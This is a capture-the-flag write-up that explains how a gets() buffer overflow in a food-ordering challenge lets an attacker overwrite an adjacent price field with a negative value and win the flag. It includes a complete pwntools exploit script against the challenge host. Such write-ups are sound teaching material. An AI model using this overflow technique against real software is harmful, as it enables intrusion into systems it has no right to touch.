solution notes

Walkthrough

Challenge 1: Recipe for Disaster (pwn)

Vulnerability Analysis

The challenge presents a food ordering system with a clear buffer overflow vulnerability:

typedef struct {
  char item[32];
  char note[32];
  int price;
} Item;

// In take_order():
gets(cur->note);  // ⚠️ DANGEROUS - no bounds checking

The gets() function allows writing beyond the 32-byte note buffer, overwriting the adjacent price field.

The Goal

The verify_total() function prints the flag when total < 0:

void verify_total(int total) {
  if (total < 0) {
    print_coupon();  // Prints /flag
    exit(0);
  }
}

Exploit Strategy

By overflowing the note field, we can overwrite the price value with a negative number, making the total negative.

Memory Layout

Item structure (68 bytes total):
┌─────────────────┬─────────────────┬─────────┐
│ item[32]        │ note[32]        │ price   │
│ offset 0        │ offset 32       │ offset 64│
└─────────────────┴─────────────────┴─────────┘

Writing 32+ bytes into note overwrites price.

Final Exploit

#!/usr/bin/env python3
from pwn import *

# Connect to remote service
conn = remote("pickled-potato-drizzled-with-torched-noodles-zzsy.gpn24.ctf.kitctf.de", 443, ssl=True)

# Select menu item 1 (price = 1337)
conn.recvuntil(b"Select item (1-6), or 0 to finish: ")
conn.sendline(b"1")

# Send payload: 32 bytes padding + negative price (0x80000000 = -2147483648)
conn.recvuntil(b"> ")
payload = b"A" * 32 + b"\x00\x00\x00\x80"
conn.sendline(payload)

# Finish order
conn.recvuntil(b"Select item (1-6), or 0 to finish: ")
conn.sendline(b"0")

# Receive flag
print(conn.recvall().decode())
conn.close()

Why It Works

  • 1337 + (-2147483648) = -2147482311 (negative)
  • verify_total() detects negative total and calls print_coupon()
  • Flag is printed before any return, no need to overwrite return address

Lessons Learned

  • Not every overflow needs control-flow hijacking.
  • Adjacent field corruption can be enough to win.
  • Signed integer logic is often a useful exploit target.
